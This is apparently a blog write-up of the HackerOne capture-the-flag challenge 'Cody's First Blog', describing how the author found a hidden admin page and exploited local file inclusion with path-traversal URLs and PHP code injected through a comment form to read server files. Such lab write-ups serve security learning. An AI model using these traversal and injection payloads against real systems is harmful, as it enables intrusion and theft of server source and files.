+++
title = "Cody's First Blog"
date = 2020-12-31
[taxonomies]
tags = ["hackerone"]
+++

### Flag0

1.  "Cody's First Blog"

    Inspecting the source reveals a URL that leads to an admin page:

    ```
    <!--<a href="?page=admin.auth.inc">Admin login</a>-->
    ```

    Navigation to URL:

    ```
    http://34.74.105.127/1512748f68/?page=admin.auth.inc
    ```

    After poking around the page, I noticed there might be a potential for LFI. This enumeration process can at least can give us recon on what is running on the backend.

    ```
    Notice: Undefined variable: title in /app/index.php on line 30

    Warning: include(../../../../etc/hosts.php): failed to open stream: No such file or directory in /app/index.php on line 21

    Warning: include(): Failed opening '../../../../etc/hosts.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /app/index.php on line 21
    ```

    Took note for files that had permission denied.
    ```
    Notice: Undefined variable: title in /app/index.php on line 30

    Warning: include(/var/log/apache2/access_log.php): failed to open stream: Permission denied in /app/index.php on line 21

    Warning: include(): Failed opening '/var/log/apache2/access_log.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /app/index.php on line 21
    ```

    ![burp-intruder](/assets/images/h1/h1-codysfirstblog-1.png)

    Going back to the enumeration process again, I figured that if there is a text box and it's running PHP on the backend, testing for injection of PHP code would be the logical next step:

    ```
    <?php phpinfo(); ?>
    ```

    ![flag0](/assets/images/h1/h1-codysfirstblog-2.png)

    Voila, flag0 has been captured.

### Flag1

1.  Circling back to the first flag, I've found the admin page but haven't discovered any vulnerabilities yet. The admin page has a login form and a text box. The text box can be used to submit comments waiting for approval. I'm guessing this means that there must be an approval page somewhere to be found. During my enumeration of possible hidden files and directories, I've managed to guess the file `admin.inc` which leads to an admin page to approve comments. Flag1 has been captured.

    ![admin-approval](/assets/images/h1/h1-codysfirstblog-3.png)

### Flag2

1.  Circling back to the potential LFI vulnerability, I tried enumerating the files using nullbytes but no luck. I tried using SQL injection authentication bypass methods and no luck either. After reading the hints given, it does mention LFI is the likely vulnerability to be targeting for. In my first attempt in flag0, I've identified the possibilities of the files that can be read with denied permissions. What I didn't check for is, can I actually read the `index.php` file that is being hosted? I started to look for ways to read files using PHP injection.

    I took notes while I was tinkering around the possibilties, I know I can read files in the local app directory:

    ```
    http://34.74.105.127/fea3c7d20a/?page=../app/admin.auth.inc
    ```

    When loading the `index.php` file, I noticed that the page tries to append an additional `.php` extension. In order to load the page properly, the URL needs to be like this:

    ```
    http://34.74.105.127/fea3c7d20a/?page=../app/index
    ```

    I can also use LFI to call upon itself to read files:

    ```
    http://34.74.105.127/fea3c7d20a/?page=http://localhost/index
    ```

    Armed with these three findings, I can combine the finding that was used in flag1 and inject PHP code to read `index.php` file. This will cause the server to execute and render the source code for `index.php`

    ```
    <?php readfile('index.php')?>
    ```
    
    Approve the comment and trigger the LFI again. Third and final flag has been captured.

    ![flag2](/assets/images/h1/h1-codysfirstblog-4.png)